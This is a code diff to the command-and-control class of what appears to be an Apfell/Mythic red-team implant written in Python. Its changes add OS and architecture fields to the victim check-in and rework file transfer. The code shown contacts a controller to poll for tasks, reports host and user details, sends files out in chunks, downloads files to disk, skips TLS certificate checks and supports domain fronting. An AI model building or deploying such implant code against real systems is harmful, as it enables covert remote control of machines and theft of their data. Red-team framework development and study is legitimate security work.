@@ -13,18 +13,18 @@ class C2():
         self.checkin_uri = "callbacks"
         self.tasking_uri = "tasks/callback/{}/nextTask"
         self.response_uri = "responses/{}"
-        self.file_uri = "files/{}/callbacks/{}"
+        self.file_uri = "files/callback/{}"
         self.id = -1
         self.interval = callback_interval
         self.jitter = 20  # this is a percentage
         self.timeout = 20  # used for doing timeouts for web connections
-        self.EKE = True if "encrypted_exchange_check" == "T" else False
+        self.EKE = "encrypted_exchange_check" == "T"
         self.aes_encryption_key = "AESPSK" if len("AESPSK") > 6 else ""
         self.chunk_size = 1024 * 1000 * 5  # 5MB chunks
         self.encryption = False
         self.host_header = "domain_front" if len("domain_front") > 0 else ""
         # adjust the checkin URI based on what we're tyring to do
-        if self.EKE == True:
+        if self.EKE:
             self.checkin_uri = "crypto/DHEKE/{}"
             self.encryption = True
             self.clientPub = DiffieHellman()
@@ -64,8 +64,11 @@ class C2():
         cipher = aes_encrypt(self.base64.b64decode(self.aes_encryption_key), data)
         return self.base64.b64encode(cipher).decode('utf-8')
 
-    def checkin(self, user="", host="", ip="", pid=""):
-        userdata = self.json.dumps({"user": user, "host": host, "ip": ip, "pid": pid, "uuid": apfell.UUID})
+    def checkin(self, user="", host="", ip="", pid="", os="", arch=""):
+        userdata = {"user": user, "host": host, "ip": ip, "pid": pid, "uuid": apfell.UUID, "os":os, "architecture": arch}
+        if user == "root":
+            userdata['integrity_level'] = 3
+        userdata = self.json.dumps(userdata)
         if self.EKE:
             # this means we're going to do an EKE to get a new key for use
             letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
@@ -74,7 +77,7 @@ class C2():
             cipher_initial_message = self.encrypt_apfell_message(initial_message)
             req = self.urllib2.Request(self.url_base + self.checkin_uri.format(apfell.UUID), cipher_initial_message, headers=self.headers)
             response = None
-            while response == None:
+            while response is None:
                 try:
                     response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                     the_page = response.read()
@@ -93,7 +96,7 @@ class C2():
                     message = self.encrypt_apfell_message(userdata)
                     req = self.urllib2.Request(self.url_base + self.checkin_uri.format(session_id), message,  headers=self.headers)
                     response = None
-                    while response == None:
+                    while response is None:
                         try:
                             response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                             the_page = response.read()
@@ -116,7 +119,7 @@ class C2():
             message = self.encrypt_apfell_message(userdata)
             req = self.urllib2.Request(self.url_base + self.checkin_uri.format(apfell.UUID), message,  headers=self.headers)
             response = None
-            while response == None:
+            while response is None:
                 try:
                     response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                     the_page = response.read()
@@ -136,7 +139,7 @@ class C2():
             # this means just do normal access
             req = self.urllib2.Request(self.url_base + self.checkin_uri, userdata,  headers=self.headers)
             response = None
-            while response == None:
+            while response is None:
                 try:
                     response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                     the_page = response.read()
@@ -154,7 +157,7 @@ class C2():
     def get_task(self):
         req = self.urllib2.Request(self.url_base + self.tasking_uri.format(self.id),  headers=self.headers)
         response = None
-        while response == None:
+        while response is None:
             try:
                 response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                 the_page = response.read()
@@ -180,7 +183,7 @@ class C2():
             message = userdata
         req = self.urllib2.Request(self.url_base + self.response_uri.format(task_id), message,  headers=self.headers)
         response = None
-        while response == None:
+        while response is None:
             try:
                 response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                 the_page = response.read()
@@ -205,7 +208,7 @@ class C2():
         chunks = (len(data) / self.chunk_size)
         if chunks == 0:
             chunks = 1
-        initial_response = self.post_response(response=self.json.dumps({"total_chunks": chunks, "task": task_id}), task_id=task_id)
+        initial_response = self.post_response(response=self.json.dumps({"total_chunks": chunks}), task_id=task_id)
         file_id = initial_response['file_id']
         for x in range(chunks):
             chunk = bdata[x*self.chunk_size:(x+1)*self.chunk_size]
@@ -213,9 +216,14 @@ class C2():
 
     def upload(self, file_id):
         # get something from the server to write to disk
-        req = self.urllib2.Request(self.url_base + self.file_uri.format(file_id, self.id),  headers=self.headers)
+        data = self.json.dumps({"file_id": file_id})
+        if self.encryption:
+            message = self.encrypt_apfell_message(data)
+        else:
+            message = data
+        req = self.urllib2.Request(self.url_base + self.file_uri.format(self.id), message, headers=self.headers)
         response = None
-        while response == None:
+        while response is None:
             try:
                 response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                 the_page = response.read()
